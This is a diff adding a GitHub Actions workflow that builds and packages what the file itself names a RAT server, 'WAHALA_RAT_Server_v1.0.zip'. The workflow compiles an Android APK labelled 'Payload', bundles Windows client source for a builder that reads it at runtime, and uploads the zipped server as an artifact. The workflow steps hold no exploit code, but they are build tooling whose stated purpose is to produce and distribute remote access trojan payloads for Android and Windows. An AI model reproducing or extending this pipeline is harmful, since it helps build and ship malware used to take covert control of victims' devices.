@@ -1,0 +1,96 @@
+name: Build WAHALA Server
+
+on:
+  push:
+    branches: [ "main", "master" ]
+  workflow_dispatch: # Allows manual trigger from GitHub UI
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v4
+
+    - name: Setup .NET 8.0 SDK
+      uses: actions/setup-dotnet@v4
+      with:
+        dotnet-version: '8.0.x'
+
+    - name: Setup Java JDK (for Android/apktool)
+      uses: actions/setup-java@v4
+      with:
+        distribution: 'temurin'
+        java-version: '17'
+
+    - name: Setup Android SDK
+      uses: android-actions/setup-android@v3
+
+    - name: Install System Tools (mingw-w64, apktool)
+      run: |
+        # Install MinGW for Windows client compilation
+        choco install mingw -y
+        
+        # Download and install apktool
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat" -OutFile "apktool.bat"
+        Invoke-WebRequest -Uri "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar" -OutFile "apktool.jar"
+        Move-Item apktool.jar C:\Windows\apktool.jar
+        Move-Item apktool.bat C:\Windows\apktool.bat
+        
+        # Ensure mingw is in PATH for the build process
+        echo "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+      shell: powershell
+
+    - name: Compile Android Base APK (Payload)
+      run: |
+        # Navigate to the Android project (assuming wave 3 structure is in ./WAHALA-Client-Android)
+        cd WAHALA-Client-Android
+        
+        # Build the debug APK
+        .\gradlew.bat assembleDebug
+        
+        # Create the ClientSource directory in the Server project
+        New-Item -ItemType Directory -Force -Path "..\src\WAHALA.Server\ClientSource"
+        
+        # Copy the built APK to the Server's ClientSource directory
+        Copy-Item "app\build\outputs\apk\debug\app-debug.apk" -Destination "..\src\WAHALA.Server\ClientSource\WAHALA_Base.apk"
+      shell: powershell
+
+    - name: Prepare Windows Client Source
+      run: |
+        # Copy the Windows client source (wave 2) into the Server's ClientSource directory
+        # Note: Adjust the path based on where you place wave 2 in the repo
+        New-Item -ItemType Directory -Force -Path "src\WAHALA.Server\ClientSource"
+        Copy-Item -Path "WAHALA-Client-Win\src\*" -Destination "src\WAHALA.Server\ClientSource\" -Recurse -Force
+      shell: powershell
+
+    - name: Restore and Publish WPF Server
+      run: |
+        cd src\WAHALA.Server
+        dotnet restore
+        # Publish self-contained so the user doesn't need .NET installed
+        dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:IncludeNativeLibrariesForSelfExtract=true -o ..\..\publish
+      shell: powershell
+
+    - name: Package Final Artifacts
+      run: |
+        # Create a deployment folder
+        New-Item -ItemType Directory -Force -Path Release
+        Copy-Item -Path "publish\*" -Destination "Release\" -Recurse
+        
+        # Ensure ClientSource is included in the release alongside the executable
+        # (The builder reads from this directory at runtime)
+        New-Item -ItemType Directory -Force -Path "Release\ClientSource"
+        Copy-Item -Path "src\WAHALA.Server\ClientSource\*" -Destination "Release\ClientSource\" -Recurse -Force
+        
+        # Zip it up
+        Compress-Archive -Path "Release\*" -DestinationPath "WAHALA_RAT_Server_v1.0.zip"
+      shell: powershell
+
+    - name: Upload Build Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: WAHALA-Server-Build
+        path: WAHALA_RAT_Server_v1.0.zip
+        retention-days: 7
